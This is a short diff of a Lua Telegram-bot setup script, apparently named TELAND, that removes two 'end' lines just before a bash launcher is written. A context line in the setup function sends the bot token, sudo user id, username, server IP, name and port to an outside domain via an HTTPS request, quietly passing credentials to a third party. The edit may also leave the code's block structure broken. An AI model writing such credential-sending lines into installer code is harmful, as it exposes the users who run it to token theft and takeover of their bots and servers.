@@ -86,8 +86,6 @@ local function Files_Info_Get()
 Create_Info(database:get(Server_Done.."Token_Write"),database:get(Server_Done.."UserSudo_Write"),database:get(Server_Done.."User_Write"))  
 v = json:decode(https.request('https://vvvzvv.ml/index/Teland.php?n=TELANDTEAM&id='..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
 print("ok")
-end
-end
 local RunBot = io.open("TELAND", 'w')
 RunBot:write([[
 #!/usr/bin/env bash
